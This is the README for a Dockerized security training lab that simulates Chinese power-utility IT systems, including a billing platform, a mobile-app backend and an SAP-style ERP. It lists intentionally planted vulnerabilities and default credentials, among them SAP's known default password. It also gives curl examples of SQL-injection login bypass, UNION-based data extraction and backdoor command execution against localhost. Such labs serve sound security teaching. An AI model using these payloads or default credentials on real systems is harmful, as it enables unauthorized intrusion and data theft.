# 🏭 电力IT系统安全靶场

专为电力行业IT系统安全研究设计的Docker化靶场环境，包含三个核心业务系统的安全测试场景。

## 🎯 项目概述

本靶场专注于电力行业IT系统（非OT系统）的安全测试，涵盖：

- **电力营销系统 2.0** - 微服务架构的营销业务系统
- **i国网APP后端** - 移动应用后端API系统  
- **ERP系统** - SAP风格的企业资源计划系统

## 🏗️ 系统架构

```
┌─────────────────────────────────────────────────────────────┐
│                    电力IT系统安全靶场                        │
├─────────────────────────────────────────────────────────────┤
│  🏭 营销系统 2.0    │  📱 i国网APP      │  🏢 ERP系统      │
│  ┌─────────────────┐│  ┌─────────────────┐│  ┌─────────────────┐│
│  │ API网关 :8080   ││  │ API服务 :9080   ││  │ 应用服务 :8000  ││
│  │ 用户服务 :8081  ││  │ 移动模拟 :9090  ││  │ Web界面 :8001   ││
│  │ 计费服务 :8082  ││  │ PostgreSQL      ││  │ PostgreSQL      ││
│  │ MySQL + Redis   ││  │ :5432           ││  │ :5433           ││
│  └─────────────────┘│  └─────────────────┘│  └─────────────────┘│
├─────────────────────────────────────────────────────────────┤
│  🔧 攻击工具                                                │
│  ┌─────────────────┐  ┌─────────────────┐                   │
│  │ Kali Linux      │  │ Wireshark       │                   │
│  │ (交互式)        │  │ :3000           │                   │
│  └─────────────────┘  └─────────────────┘                   │
└─────────────────────────────────────────────────────────────┘
```

## 🚀 快速开始

### 1. 环境要求

- Docker 20.0+
- Docker Compose 2.0+
- 8GB+ 内存
- 10GB+ 磁盘空间

### 2. 启动靶场

```bash
# 克隆项目
git clone <repository-url>
cd power-it-lab

# 给启动脚本执行权限
chmod +x start-lab.sh

# 启动靶场
./start-lab.sh
```

### 3. 选择启动模式

启动脚本提供交互式菜单：

```
请选择要启动的靶场:
1) 🏭 电力营销系统 2.0 靶场
2) 📱 i国网APP 后端靶场  
3) 🏢 ERP系统靶场 (SAP风格)
4) 🚀 启动所有靶场
5) 📊 查看靶场状态
6) 🛑 停止所有靶场
7) 🧹 清理环境
8) 📖 显示使用指南
0) 退出
```

## 🏭 电力营销系统 2.0 靶场

### 系统特点
- 微服务架构设计
- API网关统一入口
- 分布式数据库和缓存
- 海量用户数据处理

### 主要漏洞类型

| 漏洞类型 | 接口路径 | 描述 |
|---------|---------|------|
| SQL注入 | `/api/auth/login` | 登录接口存在SQL注入 |
| 越权访问 | `/api/users/:userId` | 可查询任意用户信息 |
| 命令执行 | `/api/admin/backdoor` | 管理员后门命令执行 |
| IDOR | `/api/billing/:accountId` | 可查询任意账户账单 |
| 文件上传 | `/api/upload` | 任意文件上传漏洞 |
| 信息泄露 | `/api/system/info` | 系统信息泄露 |

### 测试账户

| 用户名 | 密码 | 角色 | 说明 |
|-------|------|------|------|
| admin | admin123 | 管理员 | 系统管理员账户 |
| test | test | 管理员 | 测试账户 |
| guest | (空) | 访客 | 空密码账户 |

### 访问地址
- API网关: http://localhost:8080
- 用户服务: http://localhost:8081  
- 计费服务: http://localhost:8082
- 数据库: localhost:3306

## 📱 i国网APP 靶场

### 系统特点
- 移动应用后端API
- 短信验证码认证
- 电费查缴功能
- 业务办理流程

### 主要漏洞类型

| 漏洞类型 | 接口路径 | 描述 |
|---------|---------|------|
| 短信绕过 | `/api/auth/send-sms` | 验证码暴力破解 |
| SQL注入 | `/api/auth/login` | 密码登录SQL注入 |
| 越权访问 | `/api/user/profile` | 可修改任意用户资料 |
| IDOR | `/api/billing/query` | 可查询任意账户账单 |
| 金额篡改 | `/api/payment/create` | 支付金额客户端控制 |
| 命令执行 | `/api/admin/debug` | 管理员调试接口 |
| 文件上传 | `/api/file/upload` | 任意文件上传 |
| 信息泄露 | `/api/system/config` | 系统配置泄露 |

### 测试数据

| 手机号 | 说明 |
|-------|------|
| 13800138000 | 有完整历史数据的用户 |
| 10000000000 | 测试账户，余额999999.99 |
| 任意11位数字 | 自动注册新用户 |

### 访问地址
- API服务器: http://localhost:9080
- 移动端模拟器: http://localhost:9090
- 数据库: localhost:5432

## 🏢 ERP系统靶场 (SAP风格)

### 系统特点
- SAP风格的ERP系统
- 多客户端架构
- 财务、HR、采购模块
- 经典SAP漏洞场景

### 主要漏洞类型

| 漏洞类型 | 接口路径 | 描述 |
|---------|---------|------|
| 默认密码 | `/api/auth/login` | SAP经典默认账户 |
| SQL注入 | `/api/finance/query` | 财务查询SQL注入 |
| 越权访问 | `/api/hr/employee` | 可查询所有员工信息 |
| 命令执行 | `/api/admin/execute` | 管理员命令执行 |
| 信息泄露 | `/api/system/config` | 系统配置完全泄露 |
| 路径遍历 | `/api/report/generate` | 报表文件路径遍历 |

### 测试账户

| 用户名 | 密码 | 客户端 | 说明 |
|-------|------|--------|------|
| SAP* | 06071992 | 000 | SAP经典后门账户 |
| ADMIN | ADMIN123 | 100 | 系统管理员 |
| DDIC | DDIC | 100 | 数据字典用户 |
| GUEST | (空) | 100 | 访客账户 |

### 访问地址
- 应用服务器: http://localhost:8000
- Web界面: http://localhost:8001
- 数据库: localhost:5433

## 🔧 攻击工具

### Kali Linux 攻击机
```bash
# 进入Kali容器
docker exec -it power-kali-attacker bash

# 安装额外工具
apt update && apt install -y sqlmap burpsuite
```

### 流量监控
- Wireshark Web界面: http://localhost:3000
- 可监控所有容器间的网络流量

## 🧪 测试场景示例

### 1. SQL注入测试

**营销系统登录绕过:**
```bash
curl -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' OR 1=1--", "password": "anything"}'
```

**ERP财务数据注入:**
```bash
curl "http://localhost:8000/api/finance/query?company_code=1000'\''%20UNION%20SELECT%20*%20FROM%20sap_users--"
```

### 2. 越权访问测试

**查询任意用户信息:**
```bash
curl http://localhost:8080/api/users/1
curl http://localhost:9080/api/billing/query?account_id=1
```

### 3. 命令执行测试

**营销系统后门:**
```bash
curl -X POST http://localhost:8080/api/admin/backdoor \
  -H "Content-Type: application/json" \
  -d '{"key": "admin_backdoor_2024", "command": "id"}'
```

**ERP系统命令执行:**
```bash
curl -X POST http://localhost:8000/api/admin/execute \
  -d "admin_key=SAP_ADMIN_2024&command=whoami"
```

## 📊 监控和日志

### 查看容器日志
```bash
# 查看特定服务日志
docker-compose logs marketing-gateway
docker-compose logs iguowang-api
docker-compose logs erp-app-server

# 实时跟踪日志
docker-compose logs -f marketing-gateway
```

### 数据库连接
```bash
# 营销系统数据库
mysql -h localhost -P 3306 -u marketing_user -padmin123 power_marketing

# i国网数据库
psql -h localhost -p 5432 -U iguowang_user -d iguowang

# ERP数据库  
psql -h localhost -p 5433 -U sap_admin -d sap_erp
```

## 🛡️ 安全注意事项

⚠️ **重要提醒:**

1. **仅用于安全研究和教育目的**
2. **不要在生产环境中部署**
3. **包含故意设置的安全漏洞**
4. **建议在隔离的网络环境中运行**
5. **定期更新和清理测试环境**

## 🤝 贡献指南

欢迎提交Issue和Pull Request来改进靶场：

1. Fork 项目
2. 创建功能分支
3. 提交更改
4. 发起Pull Request

## 📄 许可证

本项目仅用于安全研究和教育目的。请遵守相关法律法规。

## 📞 联系方式

如有问题或建议，请通过以下方式联系：

- 提交GitHub Issue
- 发送邮件至项目维护者

---

**⚡ 电力IT系统安全靶场 - 专业的电力行业安全测试环境**
